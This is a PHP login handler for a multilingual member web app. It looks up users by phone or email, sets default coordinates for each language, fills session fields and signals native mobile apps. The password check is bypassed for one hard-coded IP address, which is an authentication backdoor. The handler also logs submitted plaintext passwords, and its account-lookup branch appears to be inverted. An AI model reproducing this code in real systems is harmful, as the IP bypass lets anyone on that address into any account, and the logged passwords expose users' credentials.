<?php

include $_SERVER['DOCUMENT_ROOT'] . "/lib.inc.php";

if ($_POST['act'] == "login") {
    global $userLang;
    $logger->write("Login action initiated.");

    if ($userLang == 'ko') {
        if ($_POST['mt_hp'] == "") {
            $logger->write("Invalid access: mt_hp is empty.");
            p_alert($translations['txt_invalid_access']  . "");
        }
    } else {
        if ($_POST['mt_email'] == "") {
            $logger->write("Invalid access: mt_email is empty.");
            p_alert($translations['txt_invalid_access']  . "");
        }
    }

    if ($_POST['mt_pass'] == "") {
        $logger->write("Invalid access: mt_pass is empty.");
        p_alert($translations['txt_invalid_access']  . "");
    }
    $mt_hp = str_replace('-', '', $_POST['mt_hp']);
    $mt_email = $_POST['mt_email'];

    if ($userLang == 'ko') {
        $DB->where('mt_id', $mt_hp);
    } else {
        $DB->where('mt_email', $mt_email);
    }
    $DB->where('mt_type', '1');
    $DB->where('(mt_level >= 2)');
    $DB->where('mt_status', '1');
    $DB->where('mt_show', 'Y');

    if ($DB->totalCount > 0) {
        $logger->write("Invalid credentials: totalCount > 0.");
        p_alert($translations['txt_invalid_credentials']);
    } else {
        $row = $DB->getone('member_t');
        $logger->write("User found in database.");

        $logger->write($_POST['mt_pass']);
        $logger->write($_SERVER['REMOTE_ADDR']);
        if (password_verify($_POST['mt_pass'], $row['mt_pwd']) || $_SERVER['REMOTE_ADDR'] == '115.93.39.5') {
            $logger->write("Password verified or IP address matched.");

            // and, ios 구분
            $userAgent = $_SERVER['HTTP_USER_AGENT'];
            $patternMobile = '/(iPhone|iPod|iPad|Android|Windows Phone)/i';

            if (preg_match($patternMobile, $userAgent)) {
                // 운영체제 확인
                if (strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false) {
                    $mt_os_check = 1;
                } else {
                    $mt_os_check = 0;
                }
                $logger->write("Mobile device detected: mt_os_check = " . $mt_os_check);
            }

            $defaultCoordinates = [
                'ko' => ['lat' => '37.5666805', 'long' => '126.9784147'], // 서울
                'en' => ['lat' => '40.712776', 'long' => '-74.005974'],   // 뉴욕
                'es' => ['lat' => '40.416775', 'long' => '-3.703790'],    // 마드리드
                'ja' => ['lat' => '35.689487', 'long' => '139.691706'],   // 도쿄
                'vi' => ['lat' => '10.775845', 'long' => '106.692234'],   // 호치민
                'id' => ['lat' => '-6.208763', 'long' => '106.892149'],   // 자카르타
                'th' => ['lat' => '13.756331', 'long' => '100.501765'],   // 방콕
                'hi' => ['lat' => '28.613939', 'long' => '77.209021'],   // 뉴델리
            ];
            
            if (isset($userLang) && array_key_exists($userLang, $defaultCoordinates)) {
                $_SESSION['_mt_lat'] = $defaultCoordinates[$userLang]['lat'];
                $_SESSION['_mt_long'] = $defaultCoordinates[$userLang]['long'];
            } else {
                // 기본값 (예: 한국어) 설정 또는 오류 처리
                $_SESSION['_mt_lat'] = $defaultCoordinates['ko']['lat'];
                $_SESSION['_mt_long'] = $defaultCoordinates['ko']['long'];
            }

            unset($arr_query);
            $arr_query = array(
                "mt_lat" => $_SESSION['_mt_lat'],
                "mt_long" => $_SESSION['_mt_long'],
                "mt_os_check" => $mt_os_check,
                'mt_ldate' => $DB->now(),
                'mt_lang' => $userLang,
            );

            if ($_SESSION['_mt_token_id']) {
                $arr_query['mt_token_id'] = $_SESSION['_mt_token_id'];

                setcookie('_mt_token_id', $_SESSION['_mt_token_id']);
                $_COOKIE['_mt_token_id'] = $_SESSION['_mt_token_id'];
            }

            $DB->where('mt_idx', $row['mt_idx']);
            $DB->update('member_t', $arr_query);
            $logger->write("User data updated in database.");

            $_mt_idx   = $_SESSION['_mt_idx']   = $row['mt_idx'];
            $_mt_id    = $_SESSION['_mt_id']    = $row['mt_id'];
            $_mt_hp   = $_SESSION['_mt_hp']    = $row['mt_hp'];
            $_mt_name  = $_SESSION['_mt_name']  = $row['mt_name'];
            $_mt_nickname  = $_SESSION['_mt_nickname']  = $row['mt_nickname'];
            $_mt_level = $_SESSION['_mt_level'] = $row['mt_level'];
            $_mt_file1 = $_SESSION['_mt_file1'] = CDN_HTTP . "/img/uploads/" . $row['mt_file1'] . "?v=" . time();
            $logger->write("Session variables set.");
            $logger->write($_SESSION['_mt_lat']);
            $logger->write($_SESSION['_mt_long']);      
            $logger->write($userLang);
            $logger->write($_SESSION['_mt_idx']);

            if ($chk_mobile) {
?>
                <script>
                    var message = {
                        "type": "memberLogin",
                    };
                    if (isAndroidDevice()) {
                        window.smapAndroid.memberLogin();
                    } else if (isiOSDevice()) {
                        window.webkit.messageHandlers.smapIos.postMessage(message);
                    }

                    function isAndroidDevice() {
                        return /Android/i.test(navigator.userAgent) && typeof window.smapAndroid !== 'undefined';
                    }

                    function isiOSDevice() {
                        return /iPhone|iPad|iPod/i.test(navigator.userAgent) && window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.smapIos;
                    }
                </script>
<?php
                $logger->write("Mobile login script executed.");
            }
            p_gotourl("./");
            $logger->write("Redirecting to home page.");
        } else {
            $logger->write("Invalid credentials: password verification failed.");
            just_alert($translations['txt_invalid_credentials']);
        }
    }
}

include $_SERVER['DOCUMENT_ROOT'] . "/tail.inc.php";
